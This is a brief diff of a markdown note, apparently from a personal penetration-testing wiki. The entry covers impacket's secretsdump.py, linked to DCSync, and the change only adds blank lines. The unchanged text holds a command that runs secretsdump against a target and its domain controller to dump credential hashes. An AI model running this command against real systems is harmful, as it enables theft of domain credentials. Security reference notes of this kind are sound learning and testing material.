@@ -9,9 +9,17 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # secretsdump.py
 
+
+
 **Command** ([[dcsync]]):
 
 ```bash
 /usr/share/doc/python3-impacket/examples/secretsdump.py username@target-ip -dc-ip target-ip
 
 ```
+
+
+
+
+
+
